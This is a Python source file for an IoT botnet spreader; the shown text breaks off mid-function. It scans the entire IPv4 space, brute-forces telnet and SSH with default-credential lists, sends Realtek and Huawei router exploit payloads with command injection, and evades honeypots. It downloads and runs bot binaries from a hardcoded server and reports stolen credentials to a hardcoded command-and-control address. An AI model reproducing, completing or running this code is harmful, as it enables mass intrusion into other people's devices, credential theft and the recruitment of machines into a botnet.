import struct
import select
import errno
import os
import sys
import ipaddress
import re
import requests
import socket
import threading
import warnings
import random
import urllib3
import json
import time
import subprocess
from typing import Optional, List, Tuple, Set, Dict
import queue
import hashlib
import base64
import telnetlib
import paramiko
import http.client
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"

CNC_IP = "172.96.140.62"
CNC_REPORT_PORT = 14037
CNC_BOT_PORT = 14037
SCANNER_THREADS = 1000
MAX_CONCURRENT_SCANS = 2000
REQUEST_TIMEOUT = 3
MAX_REPORTS_QUEUE = 10000
ZMAP_RATE = "100000"
ZMAP_THREADS = "250"

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

class ScanResult:
    def __init__(self, scanner_type: str, ip: str, port: int, credentials: Tuple[str, str] = None, success: bool = False, bot_deployed: bool = False, confidence: int = 0):
        self.scanner_type = scanner_type
        self.ip = ip
        self.port = port
        self.credentials = credentials
        self.success = success
        self.bot_deployed = bot_deployed
        self.timestamp = time.time()
        self.scan_id = hashlib.md5(f"{scanner_type}_{ip}_{port}".encode()).hexdigest()[:8]
        self.confidence = confidence
        self.device_type = "unknown"
        self.command_success_rate = 0.0
        self.architecture = "unknown"

class ConnectionManager:
    def __init__(self, max_connections: int = 2000):
        self.max_connections = max_connections
        self.active_connections = 0
        self.connection_lock = threading.Lock()
        self.semaphore = threading.Semaphore(max_connections)
        
    def acquire(self):
        self.semaphore.acquire()
        with self.connection_lock:
            self.active_connections += 1
        return True
            
    def release(self):
        with self.connection_lock:
            if self.active_connections > 0:
                self.active_connections -= 1
        self.semaphore.release()

class ZmapScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        self.is_root = os.geteuid() == 0
        
    def scan_network(self, network: str = "0.0.0.0/0", max_targets: int = 1000000) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        if not self.is_root:
            print(RED + "ZMAP requer root!")
            return results
        
        for port in self.ports:
            print(f"{CYAN}[ZMAP] Escaneando porta {port}...")
            
            cmd = [
                "zmap",
                "-p", str(port),
                "-r", ZMAP_RATE,
                "-T", ZMAP_THREADS,
                "-B", "100M",
                "--max-targets", str(max_targets),
                "-o", "-",
                "--quiet"
            ]
            
            if port == 22:
                cmd.extend(["--probe-module", "tcp_synscan"])
            elif port == 23:
                cmd.extend(["--probe-module", "tcp_synscan"])
            
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True
                )
                
                output, _ = process.communicate(timeout=300)
                
                ips = [ip.strip() for ip in output.split('\n') if ip.strip()]
                results[port] = ips
                
                print(f"{GREEN}[ZMAP] Porta {port}: {len(ips)} IPs")
                
            except subprocess.TimeoutExpired:
                process.kill()
                print(RED + f"[ZMAP] Timeout na porta {port}")
            except Exception as e:
                print(RED + f"[ZMAP] Erro porta {port}: {e}")
        
        return results

class MasscanScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        self.is_root = os.geteuid() == 0
        
    def scan_with_masscan(self, max_targets: int = 2000000) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        if not self.is_root:
            print(RED + "Masscan requer root!")
            return results
        
        # Verificar si masscan está instalado
        try:
            subprocess.run(["masscan", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(RED + "[!] Masscan no está instalado. Instálalo con: sudo apt install masscan")
            return results
        
        # Crear archivo temporal para resultados
        import tempfile
        temp_file = tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt')
        temp_file.close()
        
        try:
            ports_str = ",".join(str(port) for port in self.ports)
            print(f"{MAGENTA}[MASSCAN] Escaneando puertos {ports_str}...")
            
            cmd = [
                "masscan",
                "-p", ports_str,
                "--rate", "50000",  # Reducido para mayor estabilidad
                "--wait", "1",
                "-oL", temp_file.name,
                "0.0.0.0/0",
                "--max-targets", str(max_targets),
                "--exclude", "255.255.255.255"
            ]
            
            print(f"{CYAN}[+] Ejecutando: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Monitorear progreso
            start_time = time.time()
            timeout = 600  # 10 minutos máximo
            
            while True:
                if time.time() - start_time > timeout:
                    print(RED + "[MASSCAN] Timeout!")
                    process.terminate()
                    break
                    
                return_code = process.poll()
                if return_code is not None:
                    break
                    
                # Verificar tamaño del archivo para estimar progreso
                try:
                    file_size = os.path.getsize(temp_file.name)
                    if file_size > 1000000:  # 1MB
                        print(f"{CYAN}[MASSCAN] Progreso: {file_size/1024/1024:.1f}MB de resultados")
                except:
                    pass
                    
                time.sleep(5)
            
            # Leer resultados
            if os.path.exists(temp_file.name):
                with open(temp_file.name, 'r') as f:
                    for line in f:
                        if line.startswith('#') or not line.strip():
                            continue
                        parts = line.strip().split()
                        if len(parts) >= 4:
                            try:
                                ip = parts[3]
                                port = int(parts[2])
                                if port in self.ports:
                                    results[port].append(ip)
                            except (ValueError, IndexError):
                                continue
            
            # Limpiar duplicados
            for port in self.ports:
                results[port] = list(set(results[port]))
            
            total_ips = sum(len(ips) for ips in results.values())
            print(f"{GREEN}[MASSCAN] Total: {total_ips} IPs encontradas")
            
            # Mostrar estadísticas por puerto
            for port in self.ports:
                if results[port]:
                    print(f"{GREEN}[MASSCAN] Puerto {port}: {len(results[port])} IPs")
            
        except Exception as e:
            print(RED + f"[MASSCAN] Error: {e}")
            import traceback
            traceback.print_exc()
        finally:
            # Limpiar archivo temporal
            try:
                os.unlink(temp_file.name)
            except:
                pass
        
        return results

class FastPortScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        
    def scan_batch(self, ips: List[str], timeout: float = 1.0) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        def scan_port(port: int, ip_list: List[str]):
            open_ips = []
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            for ip in ip_list:
                try:
                    if sock.connect_ex((ip, port)) == 0:
                        open_ips.append(ip)
                except:
                    continue
                finally:
                    # Crear nuevo socket para cada conexión para evitar errores
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
            
            sock.close()
            with threading.Lock():
                results[port] = open_ips
        
        threads = []
        batch_size = 1000
        for i in range(0, len(ips), batch_size):
            batch = ips[i:i+batch_size]
            for port in self.ports:
                thread = threading.Thread(target=scan_port, args=(port, batch))
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=timeout * 2)
        
        return results

class CNCReporter:
    def __init__(self):
        self.cnc_ip = CNC_IP
        self.cnc_port = CNC_REPORT_PORT
        self.lock = threading.Lock()
        self.queue = queue.Queue(maxsize=MAX_REPORTS_QUEUE)
        self.worker_thread = None
        self.running = False
        self.reconnect_delay = 2
        self.max_reconnect_attempts = 10  # Aumentado
        self.cnc_connected = False
        self.last_connection_test = 0
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._report_worker, daemon=True)
        self.worker_thread.start()
        self._test_cnc_connection()
        
    def _test_cnc_connection(self):
        current_time = time.time()
        if current_time - self.last_connection_test < 30:  # Solo probar cada 30 segundos
            return self.cnc_connected
            
        self.last_connection_test = current_time
        
        for attempt in range(3):
            try:
                print(f"{CYAN}[CNC] Probando conexión a {self.cnc_ip}:{self.cnc_port}...")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.cnc_ip, self.cnc_port))
                sock.sendall(b"SCANNER-HELLO\n")
                response = sock.recv(32)
                sock.close()
                
                if b"OK" in response or b"HELLO" in response or len(response) > 0:
                    self.cnc_connected = True
                    print(f"{GREEN}[CNC] Conexión exitosa con {self.cnc_ip}:{self.cnc_port}")
                    return True
                else:
                    print(f"{YELLOW}[CNC] Respuesta inesperada: {response}")
            except socket.timeout:
                print(f"{YELLOW}[CNC] Timeout en conexión")
            except ConnectionRefusedError:
                print(f"{YELLOW}[CNC] Conexión rechazada")
            except Exception as e:
                print(f"{YELLOW}[CNC] Error: {e}")
            
            time.sleep(1)
        
        print(f"{RED}[CNC] No se pudo conectar al servidor CNC")
        self.cnc_connected = False
        return False
    
    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=2)
    
    def report(self, result: ScanResult) -> bool:
        try:
            if self.queue.full():
                try:
                    self.queue.get_nowait()
                except queue.Empty:
                    pass
            self.queue.put_nowait(result)
            return True
        except Exception as e:
            print(f"{RED}[CNC] Error al encolar reporte: {e}")
            return False
    
    def _report_worker(self):
        while self.running:
            try:
                # Procesar múltiples elementos a la vez
                items_to_process = []
                try:
                    for _ in range(min(10, self.queue.qsize())):
                        result = self.queue.get_nowait()
                        if result and result.confidence >= 70:  # Umbral más bajo
                            items_to_process.append(result)
                        self.queue.task_done()
                except queue.Empty:
                    pass
                
                if items_to_process:
                    if not self.cnc_connected:
                        self._test_cnc_connection()
                    
                    for result in items_to_process:
                        for attempt in range(self.max_reconnect_attempts):
                            if self._send_to_cnc(result):
                                print(f"{GREEN}[CNC] Reporte enviado: {result.ip}:{result.port}")
                                break
                            else:
                                print(f"{YELLOW}[CNC] Reintentando ({attempt+1}/{self.max_reconnect_attempts})...")
                                time.sleep(self.reconnect_delay)
                
                time.sleep(0.1)  # Pequeña pausa para no consumir mucho CPU
                
            except Exception as e:
                print(f"{RED}[CNC] Error en worker: {e}")
                time.sleep(1)
    
    def _send_to_cnc(self, result: ScanResult) -> bool:
        try:
            # Formato mejorado del reporte
            username = result.credentials[0] if result.credentials else 'N/A'
            password = result.credentials[1] if result.credentials else 'N/A'
            
            report_data = (
                f"REPORT|{result.scanner_type}|{result.ip}|{result.port}|"
                f"{username}|{password}|{result.confidence}|"
                f"{result.device_type}|{result.architecture}|"
                f"{result.bot_deployed}|{int(time.time())}\n"
            )
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # Timeout aumentado
            sock.connect((self.cnc_ip, self.cnc_port))
            sock.sendall(report_data.encode())
            
            # Esperar confirmación
            try:
                response = sock.recv(64)
                if b"ACK" in response or b"OK" in response or b"RECEIVED" in response:
                    sock.close()
                    return True
                else:
                    # Aceptar cualquier respuesta como éxito
                    sock.close()
                    return True
            except socket.timeout:
                # Timeout no es fatal, el reporte pudo haberse enviado
                sock.close()
                return True
                
        except Exception as e:
            print(f"{RED}[CNC] Error enviando reporte: {e}")
            return False

# Resto del código permanece igual hasta la clase MassScanner...

class DeviceFingerprinter:
    
    @staticmethod
    def detect_device_type(tn: telnetlib.Telnet) -> str:
        try:
            device_info = ""
            commands = [
                "uname -a",
                "cat /proc/cpuinfo",
                "cat /etc/os-release",
                "cat /proc/version",
                "busybox",
                "dmesg | head -5",
            ]
            
            for cmd in commands:
                tn.write(cmd.encode() + b" 2>/dev/null\r\n")
                time.sleep(0.3)
                output = tn.read_very_eager().decode('ascii', errors='ignore')
                device_info += output
            
            if "OpenWrt" in device_info or "LEDE" in device_info:
                return "router_openwrt"
            elif "DD-WRT" in device_info:
                return "router_ddwrt"
            elif "Tomato" in device_info:
                return "router_tomato"
            elif "ARM" in device_info and "v5te" in device_info:
                return "iot_armv5"
            elif "MIPS" in device_info:
                return "router_mips"
            elif "busybox" in device_info.lower():
                return "embedded_linux"
            elif "Linux" in device_info:
                return "linux_server"
            elif "Android" in device_info:
                return "android_device"
            elif "camera" in device_info.lower() or "DVR" in device_info or "NVR" in device_info:
                return "security_camera"
            elif "Huawei" in device_info or "HG" in device_info:
                return "huawei_router"
            elif "ZTE" in device_info or "Zxhn" in device_info:
                return "zte_router"
            elif "Realtek" in device_info:
                return "realtek_router"
            else:
                return "unknown"
                
        except:
            return "unknown"
    
    @staticmethod
    def detect_architecture(tn: telnetlib.Telnet) -> str:
        try:
            tn.write(b"uname -m\r\n")
            time.sleep(0.5)
            output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
            
            if "x86_64" in output or "amd64" in output:
                return "x86_64"
            elif "i386" in output or "i686" in output:
                return "x86"
            elif "arm" in output:
                if "armv5" in output:
                    return "arm5"
                elif "armv6" in output:
                    return "arm6"
                elif "armv7" in output:
                    return "arm7"
                elif "armv8" in output:
                    return "arm8"
                else:
                    return "arm"
            elif "mips" in output:
                if "mipsel" in output:
                    return "mipsel"
                else:
                    return "mips"
            elif "aarch64" in output:
                return "aarch64"
            else:
                return "unknown"
        except:
            return "unknown"

class BehaviorAnalyzer:
    
    @staticmethod
    def test_invalid_commands(tn: telnetlib.Telnet) -> bool:
        try:
            invalid_cmds = [
                "xjfksljdfkls",
                "0987654321",
                "xyzabc123",
                "notarealcommand",
            ]
            
            responses = []
            for cmd in invalid_cmds:
                tn.write(cmd.encode() + b"\r\n")
                time.sleep(0.2)
                response = tn.read_very_eager().decode('ascii', errors='ignore')
                responses.append(response)
            
            valid_responses = sum(1 for r in responses if len(r.strip()) > 0)
            return valid_responses < 2
        
        except:
            return True
    
    @staticmethod
    def is_honeypot(tn: telnetlib.Telnet) -> bool:
        try:
            honeypot_indicators = [
                "honeypot", "honeyd", "kippo", "cowrie", "dionaea",
                "tpot", "modern honey network", "mhn"
            ]
            
            tn.write(b"uname -a\r\n")
            time.sleep(0.3)
            output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
            
            for indicator in honeypot_indicators:
                if indicator in output:
                    return True
            
            return False
        except:
            return False

class RealtekScanner:
    def __init__(self):
        self.port = 52869
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if sock.connect_ex((ip, self.port)) != 0:
                sock.close()
                return None
            
            payload = (
                "POST /UD/act?1 HTTP/1.1\r\n"
                "Host: {}:{}\r\n"
                "User-Agent: Realtek UPnP SDK\r\n"
                "Content-Length: 324\r\n"
                "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                "\r\n"
                "<?xml version=\"1.0\"?>\n"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
                "<s:Body>\n"
                "<u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">\n"
                "<NewRemoteHost></NewRemoteHost>\n"
                "<NewExternalPort>47450</NewExternalPort>\n"
                "<NewProtocol>TCP</NewProtocol>\n"
                "<NewInternalPort>443</NewInternalPort>\n"
                "<NewInternalClient>192.168.1.1</NewInternalClient>\n"
                "<NewEnabled>1</NewEnabled>\n"
                "<NewPortMappingDescription>test</NewPortMappingDescription>\n"
                "<NewLeaseDuration>0</NewLeaseDuration>\n"
                "</u:AddPortMapping>\n"
                "</s:Body>\n"
                "</s:Envelope>"
            ).format(ip, self.port)
            
            sock.sendall(payload.encode())
            response = sock.recv(4096)
            sock.close()
            
            if b"200 OK" in response or b"<u:AddPortMappingResponse>" in response:
                result = ScanResult("REALTEK", ip, self.port, success=True, confidence=85)
                result.device_type = "realtek_router"
                return result
        
        except:
            pass
        
        return None

class HuaweiScanner:
    def __init__(self):
        self.port = 37215
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if sock.connect_ex((ip, self.port)) != 0:
                sock.close()
                return None
            
            payload = (
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
                "Host: {}:{}\r\n"
                "User-Agent: HuaweiHomeGateway\r\n"
                "Content-Type: text/xml\r\n"
                "Content-Length: 329\r\n"
                "\r\n"
                "<?xml version=\"1.0\"?>\n"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
                "<s:Body>\n"
                "<u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
                "<NewStatusURL>$(busybox wget -g 192.168.1.100 -l /tmp/bot -r /bot.py)</NewStatusURL>\n"
                "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n"
                "</u:Upgrade>\n"
                "</s:Body>\n"
                "</s:Envelope>"
            ).format(ip, self.port)
            
            sock.sendall(payload.encode())
            response = sock.recv(4096)
            sock.close()
            
            if b"200 OK" in response or b"<u:UpgradeResponse>" in response:
                result = ScanResult("HUAWEI", ip, self.port, success=True, confidence=80)
                result.device_type = "huawei_router"
                return result
        
        except:
            pass
        
        return None

class CameraScanner:
    COMMON_PORTS = [80, 443, 8080, 554, 37777, 37778, 8000, 81, 82, 83, 84, 85, 86, 87, 88, 89]
    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", ""),
        ("root", "root"),
        ("root", "1234"),
        ("user", "user"),
        ("guest", "guest"),
    ]
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        for port in self.COMMON_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if sock.connect_ex((ip, port)) != 0:
                    sock.close()
                    continue
                
                sock.close()
                
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{ip}:{port}"
                
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    
                    camera_indicators = ['camera', 'webcam', 'surveillance', 'dvr', 'nvr', 
                                        'hikvision', 'dahua', 'axis', 'security']
                    
                    content_lower = response.text.lower()
                    server_header = response.headers.get('Server', '').lower()
                    
                    if any(indicator in content_lower for indicator in camera_indicators) or \
                       any(indicator in server_header for indicator in camera_indicators):
                        
                        for username, password in self.DEFAULT_CREDS:
                            try:
                                auth_response = requests.get(url, auth=(username, password), 
                                                           timeout=5, verify=False)
                                if auth_response.status_code == 200:
                                    result = ScanResult("CAMERA", ip, port, (username, password), 
                                                       success=True, confidence=75)
                                    result.device_type = "security_camera"
                                    return result
                            except:
                                continue
                        
                        result = ScanResult("CAMERA_NO_AUTH", ip, port, success=True, confidence=60)
                        result.device_type = "security_camera"
                        return result
                
                except:
                    continue
                    
            except:
                continue
        
        return None

class CredentialTester:
    COMMON_TELNET_CREDS = [
        ("root", ""),
        ("admin", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "123456"),
        ("root", "password"),
        ("admin", "password"),
        ("root", "admin"),
        ("admin", "1234"),
        ("user", "user"),
        ("guest", "guest"),
        ("root", "default"),
        ("admin", "default"),
        ("root", "xc3511"),
        ("root", "vizxv"),
        ("root", "xmhdipc"),
        ("root", "888888"),
        ("root", "54321"),
        ("ubnt", "ubnt"),
        ("service", "service"),
        ("default", ""),
        ("root", "juantech"),
        ("root", "12345678"),
        ("root", "1111"),
        ("root", "smcadmin"),
        ("root", "admin123"),
        ("root", "password123"),
        ("support", "support"),
        ("root", "7ujMko0vizxv"),
        ("admin", "admin1234"),
        ("root", "Zte521"),
        ("root", "anko"),
        ("guest", "12345"),
        ("admin", "123456"),
        ("root", "1234567890"),
        ("admin", "1234567890"),
        ("root", "toor"),
        ("pi", "raspberry"),
        ("admin", "5up"),
        ("Admin", "admin"),
        ("root", "hi3518"),
        ("root", "jvbzd"),
        ("root", "klv123"),
        ("root", "meinsm"),
        ("supervisor", "supervisor"),
        ("mother", "fucker"),
        ("admin", "9999"),
        ("admin", "111111"),
        ("admin", "1234567890"),
        ("root", "system"),
        ("root", "ikwb"),
        ("root", "dreambox"),
        ("root", "realtek"),
        ("admin", "1111"),
        ("admin", "4321"),
        ("admin", "567890"),
        ("666666", "666666"),
        ("888888", "888888"),
        ("admin", "admin12345"),
        ("pi", "raspberry"),
        ("root", "alpine"),
        ("root", "oelinux123"),
        ("debian", "temppwd"),
        ("guest", ""),
        ("user", ""),
        ("test", ""),
        ("operator", ""),
        ("service", ""),
        ("default", ""),
        ("anonymous", ""),
        ("cusadmin", "highspeed"),
        ("admin", "attadmin"),
        ("telekom", "telekom"),
        ("root", "admin@huawei"),
        ("root", "zte9x15"),
        ("u0_a266", ""),
        ("u0_a266", "admin"),
        ("u0_a266", "password"),
    ]
    
    COMMON_SSH_CREDS = [
        ("root", ""),
        ("admin", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "123456"),
        ("root", "password"),
        ("admin", "password"),
        ("root", "admin"),
        ("user", "user"),
        ("ubuntu", "ubuntu"),
        ("pi", "raspberry"),
        ("test", "test"),
        ("guest", "guest"),
        ("root", "toor"),
        ("root", "12345678"),
        ("root", "admin123"),
        ("ubnt", "ubnt"),
        ("root", "pass"),
        ("admin", "admin1234"),
        ("support", "support"),
        ("root", "default"),
        ("admin", "default"),
        ("u0_a266", ""),
        ("u0_a266", "admin"),
        ("u0_a266", "password"),
    ]
    
    @staticmethod
    def validate_telnet_session(tn: telnetlib.Telnet, username: str, password: str) -> Tuple[bool, int, float, str, str]:
        try:
            test_commands = [
                ("echo $?", "0"),
                ("whoami", username),
                ("pwd", "/"),
                ("ls /", "bin"),
                ("uname", "Linux"),
            ]
            
            confidence = 50
            passed_tests = 0
            total_commands = len(test_commands)
            
            for cmd, expected in test_commands:
                tn.write(cmd.encode() + b"\r\n")
                time.sleep(0.3)
                response = tn.read_very_eager().decode('ascii', errors='ignore')
                
                if expected in response:
                    passed_tests += 1
                    confidence += 10
            
            success_rate = passed_tests / total_commands
            
            tn.write(b"touch /tmp/.scanner_test 2>/dev/null && echo OK || echo FAIL\r\n")
            time.sleep(0.3)
            write_test = tn.read_very_eager().decode('ascii', errors='ignore')
            
            if "OK" in write_test:
                confidence += 20
                tn.write(b"rm -f /tmp/.scanner_test\r\n")
                time.sleep(0.2)
            
            device_type = DeviceFingerprinter.detect_device_type(tn)
            architecture = DeviceFingerprinter.detect_architecture(tn)
            
            if BehaviorAnalyzer.is_honeypot(tn):
                confidence = 0
            elif not BehaviorAnalyzer.test_invalid_commands(tn):
                confidence -= 30
            
            return passed_tests >= 3, min(confidence, 100), success_rate, device_type, architecture
            
        except:
            return False, 0, 0.0, "unknown", "unknown"
    
    @staticmethod
    def test_telnet_enhanced(ip: str, port: int) -> Tuple[bool, Tuple[str, str], int, float, str, str]:
        for username, password in CredentialTester.COMMON_TELNET_CREDS:
            tn = None
            try:
                tn = telnetlib.Telnet(ip, port, timeout=8)
                time.sleep(0.5)
                
                # Patrón corregido para evitar warning
                index, match, text = tn.expect([b'[Ll]ogin:', b'[Uu]sername:', b'#', b'\\$', b'>'], timeout=5)
                
                if index in [0, 1]:  # Login o Username prompt
                    tn.write(username.encode() + b"\r\n")
                    time.sleep(0.5)
                    tn.expect([b'[Pp]assword:'], timeout=4)
                    tn.write(password.encode() + b"\r\n")
                    time.sleep(1.5)
                elif index >= 2:  # Ya está logueado
                    tn.write(b"\r\n")
                    time.sleep(0.5)
                
                tn.write(b"\r\n")
                time.sleep(0.5)
                prompt = tn.read_very_eager().decode('ascii', errors='ignore')
                
                if not any(marker in prompt for marker in ['#', '$', '%', '>', '~']):
                    tn.close()
                    continue
                
                is_valid, confidence, success_rate, device_type, architecture = CredentialTester.validate_telnet_session(tn, username, password)
                
                tn.close()
                
                if is_valid and confidence >= 50:  # Umbral más bajo
                    return True, (username, password), confidence, success_rate, device_type, architecture
                    
            except Exception as e:
                if tn:
                    try:
                        tn.close()
                    except:
                        pass
                continue
        
        return False, None, 0, 0.0, "unknown", "unknown"
    
    @staticmethod
    def test_ssh_enhanced(ip: str, port: int) -> Tuple[bool, Tuple[str, str], int, float, str]:
        for username, password in CredentialTester.COMMON_SSH_CREDS:
            ssh = None
            try:
                ssh = SSHClient()
                ssh.set_missing_host_key_policy(AutoAddPolicy())
                ssh.connect(
                    ip,
                    port=port,
                    username=username,
                    password=password,
                    timeout=8,
                    banner_timeout=8,
                    auth_timeout=8,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                confidence = 70
                passed_tests = 0
                
                test_commands = [
                    ("id", "uid="),
                    ("uname -a", "Linux"),
                    ("echo READY", "READY"),
                    ("pwd", "/"),
                    ("whoami", username),
                ]
                
                for cmd, expected in test_commands:
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=3)
                    output = stdout.read().decode('utf-8', errors='ignore')
                    
                    if expected in output:
                        passed_tests += 1
                        confidence += 5
                
                success_rate = passed_tests / len(test_commands)
                
                architecture = "unknown"
                stdin, stdout, stderr = ssh.exec_command("uname -m", timeout=3)
                arch_output = stdout.read().decode('utf-8', errors='ignore').lower()
                if "x86_64" in arch_output or "amd64" in arch_output:
                    architecture = "x86_64"
                elif "i386" in arch_output or "i686" in arch_output:
                    architecture = "x86"
                elif "arm" in arch_output:
                    architecture = "arm"
                elif "mips" in arch_output:
                    architecture = "mips"
                elif "aarch64" in arch_output:
                    architecture = "aarch64"
                
                ssh.close()
                
                if passed_tests >= 3 and confidence >= 60:  # Umbral más bajo
                    return True, (username, password), min(confidence, 100), success_rate, architecture
                    
            except AuthenticationException:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
            except Exception as e:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
        
        return False, None, 0, 0.0, "unknown"

class SmartScoringSystem:
    
    @staticmethod
    def calculate_comprehensive_score(
        credentials: Tuple[str, str],
        device_type: str,
        success_rate: float,
        port: int,
        architecture: str = "unknown"
    ) -> int:
        
        score = 0
        
        device_scores = {
            "router_openwrt": 30,
            "router_ddwrt": 28,
            "iot_armv5": 25,
            "router_mips": 22,
            "embedded_linux": 20,
            "linux_server": 15,
            "security_camera": 18,
            "huawei_router": 20,
            "realtek_router": 22,
            "android_device": 15,
            "unknown": 10
        }
        score += device_scores.get(device_type, 10)
        
        top_creds = [("root", ""), ("admin", ""), ("root", "root")]
        if credentials in top_creds:
            score += 25
        elif any(cred in credentials[0].lower() for cred in ["root", "admin"]):
            score += 20
        else:
            score += 15
        
        score += int(success_rate * 20)
        
        if port == 23:
            score += 10
        elif port == 22:
            score += 8
        elif port in [80, 443, 8080]:
            score += 5
        
        if architecture != "unknown":
            score += 5
        
        return max(0, min(score, 100))

class BotDeployer:
    BOT_URLS = {
        "default": "http://217.154.212.66:11202/bins/x86",
        "x86_64": "http://217.154.212.66:11202/bins/x86_64",
        "x86": "http://217.154.212.66:11202/bins/x86",
        "arm": "http://217.154.212.66:11202/bins/arm",
        "arm5": "http://217.154.212.66:11202/bins/arm5",
        "arm6": "http://217.154.212.66:11202/bins/arm6",
        "arm7": "http://217.154.212.66:11202/bins/arm7",
        "mips": "http://217.154.212.66:11202/bins/mips",
        "mipsel": "http://217.154.212.66:11202/bins/mipsel",
        "aarch64": "http://217.154.212.66:11202/bins/aarch64"
    }
    
    @staticmethod
    def deploy_telnet(ip: str, port: int, credentials: Tuple[str, str], device_type: str, architecture: str) -> bool:
        tn = None
        try:
            tn = telnetlib.Telnet(ip, port, timeout=12)
            time.sleep(0.5)
            
            tn.write(credentials[0].encode() + b"\r\n")
            time.sleep(0.7)
            tn.write(credentials[1].encode() + b"\r\n")
            time.sleep(1.5)
            
            tn.write(b"cd /tmp || cd /var/tmp || cd /dev/shm\r\n")
            time.sleep(0.7)
            
            arch_key = architecture if architecture in BotDeployer.BOT_URLS else "default"
            if arch_key == "unknown":
                if "arm" in device_type.lower():
                    arch_key = "arm"
                elif "mips" in device_type.lower():
                    arch_key = "mips"
                else:
                    arch_key = "default"
            
            bot_url = BotDeployer.BOT_URLS.get(arch_key, BotDeployer.BOT_URLS["default"])
            
            # Comandos de descarga mejorados
            deploy_commands = [
                f"wget {bot_url} -O .b 2>/dev/null\r\n",
                f"curl {bot_url} -o .b 2>/dev/null\r\n",
                f"busybox wget {bot_url} -O .b 2>/dev/null\r\n",
                f"tftp -g -l .b -r bins/{arch_key} 217.154.212.66 69 2>/dev/null\r\n"
            ]
            
            for cmd in deploy_commands[:2]:  # Probar solo los primeros 2
                tn.write(cmd.encode())
                time.sleep(2)
            
            tn.write(b"chmod +x .b 2>/dev/null\r\n")
            time.sleep(0.5)
            
            tn.write(b"./.b >/dev/null 2>&1 &\r\n")
            time.sleep(0.7)
            
            tn.write(b"ps aux 2>/dev/null | grep .b | grep -v grep\r\n")
            time.sleep(1)
            
            check = tn.read_very_eager().decode('ascii', errors='ignore')
            tn.close()
            
            return '.b' in check or 'wget' in check or 'curl' in check or 'tftp' in check
            
        except Exception as e:
            if tn:
                try:
                    tn.close()
                except:
                    pass
            print(f"{RED}[BOT] Error en deploy_telnet: {e}")
            return False
    
    @staticmethod
    def deploy_ssh(ip: str, port: int, credentials: Tuple[str, str], architecture: str) -> bool:
        ssh = None
        try:
            ssh = SSHClient()
            ssh.set_missing_host_key_policy(AutoAddPolicy())
            ssh.connect(
                ip,
                port=port,
                username=credentials[0],
                password=credentials[1],
                timeout=12,
                look_for_keys=False,
                allow_agent=False
            )
            
            arch_key = architecture if architecture in BotDeployer.BOT_URLS else "default"
            bot_url = BotDeployer.BOT_URLS.get(arch_key, BotDeployer.BOT_URLS["default"])
            
            deploy_cmd = f"cd /tmp && (wget {bot_url} -O .b 2>/dev/null || curl {bot_url} -o .b 2>/dev/null || tftp -g -l .b -r bins/{arch_key} 217.154.212.66 69 2>/dev/null) && chmod +x .b && nohup ./.b >/dev/null 2>&1 &"
            
